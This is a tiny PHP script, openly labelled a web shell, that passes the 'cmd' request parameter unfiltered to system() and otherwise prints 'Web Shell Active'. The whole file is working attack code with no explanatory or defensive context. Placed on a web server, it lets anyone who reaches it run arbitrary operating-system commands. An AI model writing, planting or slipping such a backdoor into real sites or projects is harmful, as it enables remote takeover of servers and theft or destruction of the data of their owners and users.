<?php 
if(isset($_GET['cmd'])) { 
   
 system($_GET['cmd']); 
} else { 
    echo "Web Shell Active"; 
}
?>
